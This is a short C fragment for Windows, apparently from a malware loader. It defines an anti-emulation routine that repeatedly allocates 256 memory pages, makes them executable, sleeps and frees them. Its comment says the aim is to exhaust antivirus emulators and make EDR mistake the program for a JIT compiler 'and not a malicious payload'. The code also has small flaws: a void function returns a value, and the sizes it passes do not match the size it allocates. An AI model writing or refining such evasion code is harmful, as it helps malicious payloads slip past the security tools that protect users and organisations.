
#define ALLOC_NUM 256


/* This will allocate ALLOC_NUM RW memory regions, 
     set them to RX, and free them 

    The idea is that the AV emulator will probably give up, either because
    of used memory is above maximum, or amount of instructions, or 
    number of API calls, or time. 

    It hopefully also makes the EDR think this program is doing some
    kind of interpreter or JIT compilation, and not a malicious payload.
*/

void antiemulation() {
    void* allocs[ALLOC_NUM];
    DWORD result;

    for(int i=0; i<4; i++) {
        
        for(int n=0; n<ALLOC_NUM; n++) {
            allocs[n] = VirtualAlloc(
                NULL, 
                0x1000, 
                0x3000, 
                p_RW
            );
        }

        for(int n=0; n<ALLOC_NUM; n++) {
            if (VirtualProtect(
                allocs[n], 
                1000, 
                p_RX, 
                &result) == 0) 
            {
                return 7;
            }
        }

        Sleep(200);

        BOOL bSuccess;
        for(int n=0; n<ALLOC_NUM; n++) {
            bSuccess = VirtualFree(
                            allocs[n],
                            1000,
                            0x00008000); // MEM_RELEASE
        }
    }


}
